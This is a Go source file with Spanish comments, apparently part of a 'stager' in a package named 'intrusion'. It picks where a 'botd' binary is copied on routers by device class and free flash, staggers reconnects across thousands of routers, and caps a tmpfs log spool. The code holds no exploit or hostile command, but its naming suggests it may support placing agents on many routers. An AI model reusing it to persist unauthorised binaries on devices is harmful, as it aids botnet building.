package intrusion

import (
	"errors"
	"fmt"
	"math/rand/v2"
	"os"
	"path/filepath"
	"strings"
)

// Umbrales de flash de clase C (BLUEPRINT §2: 32 MB RAM / 8 MB flash).
const (
	// FlashDetectKB: overlay por debajo de esto es clase C declarada → tmpfs-only.
	FlashDetectKB = 8 * 1024
	// FlashMinFreeKB: libre mínimo exigido en /tmp antes de copiar el binario.
	FlashMinFreeKB = 4 * 1024
	// SpoolMaxKB: tope del spool contable en tmpfs (T-0206 criterio 3).
	SpoolMaxKB = 64
)

// ErrFlashCap es el tope de flash: sin 4 MB libres no se copia y el stager
// aborta en vez de llenar el overlay (la clase C no sobrevive a un fill-up).
var ErrFlashCap = errors.New("stager: libre en tmp/overlay insuficiente (< 4 MB)")

// DestPolicy decide el destino del binario: /data/botd para clases A/B
// (persistente, slots A/B del BLUEPRINT §4) y /tmp para clase C o cuando el
// overlay medido es menor que 8 MB. overlayFreeKB < 0 significa "sin medir".
// Exige FlashMinFreeKB libre antes de autorizar la copia.
func DestPolicy(deviceClass string, overlayFreeKB int64) (dir string, reason string, err error) {
	classC := strings.EqualFold(deviceClass, "C")
	smallOverlay := overlayFreeKB >= 0 && overlayFreeKB < FlashDetectKB
	if overlayFreeKB >= 0 && overlayFreeKB < FlashMinFreeKB {
		return "", "", ErrFlashCap
	}
	if classC || smallOverlay {
		return "/tmp", "tmpfs-only: overlay < 8 MB o clase C", nil
	}
	return "/data/botd", "persistente: clase " + strings.ToUpper(deviceClass), nil
}

// RetryDelayS es el retardo del reintento `attempt` (1-based): backoff lineal
// base*attempt + jitter entero en [0, jitterRangeS]. En segundos enteros a
// propósito: busybox `sleep` no garantiza fracciones y un router de 2009 no
// necesita más granularidad. El jitter evita que 10.000 routers reconecten
// al unísono tras un corte (T-0205 criterio 3).
func RetryDelayS(baseS, attempt, jitterRangeS int64, rnd *rand.Rand) int64 {
	if attempt < 1 {
		attempt = 1
	}
	jitter := int64(0)
	if jitterRangeS > 0 {
		if rnd != nil {
			jitter = rnd.Int64N(jitterRangeS + 1)
		} else {
			jitter = rand.Int64N(jitterRangeS + 1)
		}
	}
	return baseS*int64(attempt) + jitter
}

// Spool es el spool contable de clase C en tmpfs: un solo fichero con tope
// duro en disco. Al rebasar el tope se recorta la cabecera (lo más viejo):
// el medidor autoritativo es el nodo y lo recortado ya viajó en flush previos.
type Spool struct {
	Dir   string
	MaxKB int64
}

func (s *Spool) path() string { return filepath.Join(s.Dir, "spool.log") }

// Append añade entradas y aplica el tope recortando lo más viejo. Tras
// cualquier escritura, du/size del fichero queda ≤ MaxKB.
func (s *Spool) Append(lines []string) error {
	if s.MaxKB <= 0 {
		return fmt.Errorf("spool: MaxKB inválido")
	}
	if err := os.MkdirAll(s.Dir, 0o755); err != nil {
		return err
	}
	f, err := os.OpenFile(s.path(), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	for _, l := range lines {
		if _, err := f.WriteString(strings.TrimRight(l, "\n") + "\n"); err != nil {
			f.Close()
			return err
		}
	}
	if err := f.Close(); err != nil {
		return err
	}
	return s.trim()
}

func (s *Spool) trim() error {
	b, err := os.ReadFile(s.path())
	if err != nil {
		return err
	}
	max := int(s.MaxKB * 1024)
	if len(b) <= max {
		return nil
	}
	tail := b[len(b)-max:]
	if i := strings.IndexByte(string(tail), '\n'); i >= 0 { // empezar en línea completa
		tail = tail[i+1:]
	}
	return os.WriteFile(s.path(), tail, 0o600)
}

// UsedKB reporta el uso real del spool en KiB (lo que vería `du -k`).
func (s *Spool) UsedKB() (int64, error) {
	st, err := os.Stat(s.path())
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return 0, nil
		}
		return 0, err
	}
	return (st.Size() + 1023) / 1024, nil
}
